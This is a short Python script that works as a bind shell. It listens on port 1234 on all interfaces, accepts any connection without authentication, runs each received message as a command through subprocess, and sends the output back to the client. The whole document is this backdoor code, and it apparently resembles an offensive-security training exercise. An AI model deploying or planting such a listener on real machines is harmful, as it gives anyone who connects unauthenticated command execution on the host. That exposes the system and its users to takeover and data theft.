import socket
import threading, subprocess,sys

bind_ip = '0.0.0.0'
bind_port = 1234

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((bind_ip,bind_port))

server.listen(5)

def handle_client(client_socket):
	while True:
		request  = client_socket.recv(4096)
		print(f"Received: {str(request)}")
		if request == b'exit':
			print("Client Disconnected!")
			break
		else:
			output = subprocess.check_output([request])
			client_socket.send(output)

while True:
	print("Waiting for connection on port {}".format(bind_port))
	client,addr = server.accept()
	print(f"Accepted connection from :{addr[0]}:{addr[1]}")
	client_handler = threading.Thread(target=handle_client,args=(client,))
	client_handler.start()

